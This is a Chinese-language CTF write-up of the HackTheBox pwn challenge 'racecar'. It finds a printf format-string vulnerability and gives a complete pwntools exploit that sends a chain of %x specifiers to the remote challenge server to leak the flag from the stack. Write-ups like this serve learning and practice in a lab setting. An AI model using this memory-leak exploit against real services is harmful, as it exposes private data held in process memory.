---
layout: post
title: "hackbox pwn racecar wp"
date:   2022-3-10
tags: [ctf_wp]
comments: true
author: wsxk
---

### 1.运行
拿到文件，当然是先让他跑起来看看会发生什么

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/1.png)

看起来是跑车小游戏

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/2.png)

显然选项2才正常开始游戏

接下来让你选择车型，赛道

当我选完1车型 2赛道后，出现了奇怪的东西

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/3.png)

打不开flag.txt

有点意思，这时候我们可以创建一个flag.txt然后往里面输点东西

之后出现的情况是下面这样的

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/4.png)

### 2.分析程序

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/5.png)

哦吼，看到了printf函数的格式化字符串漏洞

稍微调试一下

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/6.png)

然后看下格式化字符串出现的东西

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-10-hackbox-pwn-racecar/7.png)


第11个就是我们输入的flag的4个字节啦

### 3.exp编写
编写exp有些值得质疑的点，比如收到的%x-%x...形式的字符串
需要去首尾空格，然后看看分片

用binascii库的 a2b_hex时，顺序的反的，需要倒过来



    from pwn import *
    from binascii import a2b_hex

    #io = process("./racecar")
    io = remote("178.128.168.198",30254)

    io.recvuntil("Name:")
    io.sendline("wsxk")
    io.recvuntil("Nickname:")
    io.sendline("wsxk")

    io.recvuntil("Car selection")
    io.sendline(str(2))
    io.recvuntil("Select car:")
    io.sendline(str(1))

    io.recvuntil("Select race:")
    io.sendline(str(2))

    io.recvuntil("Do you have anything to say to the press after your big victory?")
    io.sendline("%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x")

    io.recvuntil("The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:")
    io.recvline()
    return_strings=io.recvline()
    #print(return_strings)

    flag = (bytes(return_strings).strip()).rsplit(b"-")
    print(flag)
    true_flag = b""
    for i in range(11,len(flag)):
        if len(flag[i])%2:
            flag[i] = b'0'+flag[i]
        #print(a2b_hex(flag[i])[::-1])
        true_flag += a2b_hex(flag[i])[::-1]
        if b"}" in true_flag:
            break
    print(true_flag)

